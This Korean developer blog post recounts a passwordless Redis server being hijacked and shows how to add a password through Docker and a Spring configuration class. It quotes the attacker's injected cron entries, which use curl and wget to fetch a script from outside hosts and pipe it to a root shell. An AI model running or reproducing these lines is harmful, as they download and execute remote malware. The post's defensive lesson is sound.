---
date: 2023-03-9
title: "TTL 설정 없이도 Redis 저장 내용이 사라진다면"
category :
  - Java & Spring
permalink: /java-spring/TTL 설정 없이도 Redis 저장 내용이 사라진다면/

toc: true
toc_sticky: true
---<p><img alt="" src="https://velog.velcdn.com/images/kny8092/post/1ab5e216-20ad-43cc-92f4-183e13d10b42/image.png" /></p>
<p>분명히 로컬에서 Test 했을 때는 정상적으로 동작했고, 배포 된 서버에 요청을 보냈을 때 Redis에 원하는 값이 저장되는 것을 확인했다.
그런데.. 몇 시간뒤나 다음날 다시 테스트하려고 하면 자꾸 캐싱해둔 내용이 사라져있다...
초면인 backup1 ~ backup4가 있다...
혹시 redis 비밀번호를 따로 설정하지 않았다면</p>
<blockquote>
<p>누군가 내 작고 소중한 Redis를 몰래 쓰고있다.</p>
</blockquote>
<p>이전에 부스트캠프 프로젝트를 하면서 다른 조에서 해킹을 당했었다는 내용을 공유받은 적이 있었는데, 그 당시에는 Redis 사용을 고려하지 않았고 우리 프로젝트는 github star도 많지 않으니 해킹을 당하겠어? 라는 아주 안일한 생각을 하고 있었다.</p>
<p>처음에는 TTL설정 문제인줄 알고 Redis default TTL을 계속 찾아봤다.
하지만 관련 문제는 아니였다.</p>
<p>다음에 했던 것이 Redis에 어떤 command가 날라왔는지 조사를 했는데, 엄청 많은 요청이 계속 들어오고 있었다.</p>
<pre><code class="language-shell">&gt; redis-cli
&gt; monitor</code></pre>
<img height="50%" src="https://velog.velcdn.com/images/kny8092/post/309d8b55-3815-4705-8cc0-60001ba94c5f/image.png" />


<p>그제서야 전에 해킹관련 이야기를 들었던 것이 생각이 났고, 찾아보기 시작했다.
(이후에 알았지만 저 명령들은 내 Redis Explorer에서 요청보낸 것..)</p>
<h3 id="누구세요">누구세요</h3>
<p>backup에 적힌 내용을 가만히 살펴보니 다음과 같았다.</p>
<pre><code class="language-shell">*/2 * * * * root cd1 -fsSL http://en2an.top/cleanfda/init.sh | sh
*/3 * * * * root wget -q -O- http://en2an.top/cleanfda/init.sh | sh
*/4 * * * * root curl -fsSL http://45.83.123.29/cleanfda/init.sh | sh
*/5 * * * * root wd1 -q -O- http://45.83.123.29/cleanfda/init.sh | sh</code></pre>
<p>주기적으로 스크립트를 다운받아 실행 시키고 있었다.</p>
<p><img alt="" src="https://velog.velcdn.com/images/kny8092/post/cc49ce32-5227-4e5a-a356-a76687adc4e9/image.png" /></p>
<p>ip를 찾아봤을 때 우리나라는 아니였다.. 저 sh을 받아보고 싶었지만, 무슨 위험이 있을지 몰라서 빤히 쳐다보는 일 밖에 할 수 없다...;;</p>
<h3 id="외양간-고치기">외양간 고치기</h3>
<p>비밀번호는 다음 명령으로 설정 가능하다.</p>
<pre><code class="language-shell"># docker container 실행 시 설정
$ docker run --name redis -p 6379:6379 -d redis --requirepass {password}

# docker 내부 접속하여 redis cli 명령을 사용하고 싶을 때
$ docker exec -it redis redis-cli -a {password}</code></pre>
<pre><code class="language-java">
@Configuration
public class RedisConfig {

    @Value("${spring.redis.host}")
    private String host;

    @Value("${spring.redis.port}")
    private Integer port;

    @Value("${spring.redis.password}")
    private String password; # 비밀번호 설정 추가

    @Bean
    public RedisConnectionFactory redisConnectionFactory() {
        RedisStandaloneConfiguration redisStandaloneConfiguration = new RedisStandaloneConfiguration();
        redisStandaloneConfiguration.setHostName(host);
        redisStandaloneConfiguration.setPort(port);
        redisStandaloneConfiguration.setPassword(password);
        LettuceConnectionFactory lettuceConnectionFactory = new LettuceConnectionFactory(redisStandaloneConfiguration);
        return lettuceConnectionFactory;
    }
}
</code></pre>
<h3 id="교훈">교훈</h3>
<p>서버 환경에 배포 시에는 password 설정과 port 허용에 신경쓰자!</p>
<hr />
<p>참고
<a href="https://gofnrk.tistory.com/84">https://gofnrk.tistory.com/84</a>
<a href="http://redisgate.kr/redis/education/redis_hacking.php">http://redisgate.kr/redis/education/redis_hacking.php</a></p>